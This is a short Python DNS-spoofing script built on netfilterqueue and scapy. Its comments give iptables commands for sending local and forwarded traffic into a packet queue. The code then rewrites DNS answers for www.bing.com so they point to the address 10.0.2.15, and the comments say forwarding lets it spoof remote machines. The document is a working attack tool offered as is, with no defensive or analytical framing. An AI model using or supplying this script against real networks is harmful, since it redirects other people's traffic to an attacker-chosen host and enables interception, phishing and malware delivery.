
# Before running this script, you need to bind traffic to queue 0 in iptables
# $ iptables -I INPUT -j NFQUEUE --queue-num 0
# $ iptables -I OUTPUT -j NFQUEUE --queue-num 0

# For spoofing remote machines you need forward traffic
# $ iptables -I FORWARD -j NFQUEUE --queue-num 0


import netfilterqueue
import scapy.all as scapy

def processPacket(packet):
	scapyPacket = scapy.IP(packet.get_payload())
	if scapyPacket.haslayer(scapy.DNSRR):
		qname = scapyPacket[scapy.DNSQR].qname
		if "www.bing.com" in str(qname):
			print("[+] Spoofing Target")
			answer = scapy.DNSRR(rrname=qname, rdata="10.0.2.15")
			scapyPacket[scapy.DNS].an = answer
			scapyPacket[scapy.DNS].ancount = 1

			del scapyPacket[scapy.IP].len
			del scapyPacket[scapy.IP].chksum
			del scapyPacket[scapy.UDP].len
			del scapyPacket[scapy.UDP].chksum

			packet.set_payload(str(scapyPacket))

	packet.accept()


queue = netfilterqueue.NetfilterQueue()
queue.bind(0, processPacket)
queue.run()